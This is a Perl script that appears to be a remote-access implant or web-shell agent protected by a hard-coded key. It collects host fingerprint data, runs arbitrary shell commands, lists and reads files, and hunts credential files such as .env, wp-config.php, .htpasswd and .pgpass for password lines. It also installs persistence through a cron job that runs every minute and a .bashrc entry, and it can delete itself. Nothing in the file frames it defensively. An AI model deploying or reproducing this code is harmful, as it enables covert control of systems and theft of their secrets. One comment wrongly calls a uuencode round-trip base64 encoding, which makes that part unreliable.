#!/usr/bin/perl
use strict;
use warnings;
use Cwd;

my $AUTH_KEY = "sentinelx_2024";
my $CWD = getcwd();

sub json_str {
    my $s = shift;
    $s =~ s/\\/\\\\/g; $s =~ s/"/\\"/g; $s =~ s/\n/\\n/g; $s =~ s/\t/\\t/g; $s =~ s/\r/\\r/g;
    return '"' . $s . '"';
}

sub encode_json {
    my $ref = shift;
    my $type = ref $ref;
    if ($type eq 'HASH') {
        my @parts;
        while (my ($k, $v) = each %$ref) {
            push @parts, json_str($k) . ':' . encode_json($v);
        }
        return '{' . join(',', @parts) . '}';
    } elsif ($type eq 'ARRAY') {
        my @parts = map { encode_json($_) } @$ref;
        return '[' . join(',', @parts) . ']';
    } elsif (!defined $ref) {
        return 'null';
    } elsif ($ref =~ /^-?\d+(\.\d+)?$/) {
        return $ref;
    } else {
        return json_str($ref);
    }
}

sub beacon {
    my $host = `hostname`; chomp $host;
    my $os = `uname -s -r`; chomp $os;
    my $user = `whoami`; chomp $user;
    return { status => "ok", data => {
        hostname => scalar $host, os => scalar $os,
        user => scalar $user, cwd => $CWD,
        perl => $],
    }};
}

sub exec_cmd {
    my $cmd = shift;
    my $output = `$cmd 2>&1`;
    return { status => "ok", output => $output, cwd => getcwd() };
}

sub file_list {
    my $path = shift || ".";
    opendir(my $dh, $path) or return { status => "error", message => "Cannot open $path" };
    my @items;
    while (my $e = readdir($dh)) {
        next if $e eq "." || $e eq "..";
        my $fp = "$path/$e";
        push @items, { name => $e, type => (-d $fp ? "dir" : "file"), size => (-f $fp ? -s $fp : 0) };
    }
    closedir($dh);
    return { status => "ok", items => \@items, path => Cwd::abs_path($path) };
}

sub file_read {
    my $path = shift;
    open(my $fh, "<:raw", $path) or return { status => "error", message => $! };
    my $data; read($fh, $data, -s $path); close($fh);
    my $b64 = unpack("u", pack("u", $data)); # primitive base64 via uuencode
    return { status => "ok", content => $b64 };
}

sub password_hunt {
    my @targets = (".env", "config.php", "wp-config.php", ".htpasswd", ".my.cnf", ".pgpass");
    my @roots = ($CWD, "/var/www/html", "/etc", $ENV{HOME} || "/root");
    my @hits;
    for my $root (@roots) { next unless -d $root;
        for my $t (@targets) { my $fp = "$root/$t"; next unless -f $fp;
            open(my $fh, "<:encoding(utf-8)", $fp) or next;
            my $i = 1;
            while (my $line = <$fh>) { chomp $line;
                if ($line =~ /password|pass|secret|key|db_pass/i) {
                    push @hits, { file => $fp, line => $i, match => substr($line, 0, 200) };
                } $i++;
            } close($fh);
        }
    }
    return { status => "ok", hits => \@hits, count => scalar @hits };
}

sub persistence {
    my $method = shift || 'all';
    my @results;
    if ($method eq 'cron' || $method eq 'all') {
        my $self = $0;
        open(my $cron, "-|", "crontab -l 2>/dev/null") or return;
        my @lines = <$cron>; close($cron);
        push @lines, "* * * * * perl $self >/dev/null 2>&1\n";
        open(my $w, "|-", "crontab -") or return;
        print $w @lines; close($w);
        push @results, { method => 'cron', status => 'installed' };
    }
    if ($method eq 'bashrc' || $method eq 'all') {
        my $rc = "$ENV{HOME}/.bashrc";
        open(my $fh, ">>", $rc) or return;
        print $fh "\nperl $0 >/dev/null 2>&1 &\n"; close($fh);
        push @results, { method => 'bashrc', status => 'installed' };
    }
    return { status => "ok", results => \@results };
}

sub self_destruct { unlink $0; return { status => "ok" }; }

my $action = $ARGV[0] || "beacon";
my $result = { status => "error", message => "Unknown action" };

if ($action eq "beacon") { $result = beacon(); }
elsif ($action eq "exec") { $result = exec_cmd(join(" ", @ARGV[1..$#ARGV])); }
elsif ($action eq "file_list") { $result = file_list($ARGV[1] || "."); }
elsif ($action eq "file_read") { $result = file_read($ARGV[1] || ""); }
elsif ($action eq "password_hunt") { $result = password_hunt(); }
elsif ($action eq "persistence") { $result = persistence($ARGV[1] || 'all'); }
elsif ($action eq "self_destruct") { $result = self_destruct(); }

print encode_json($result) . "\n";
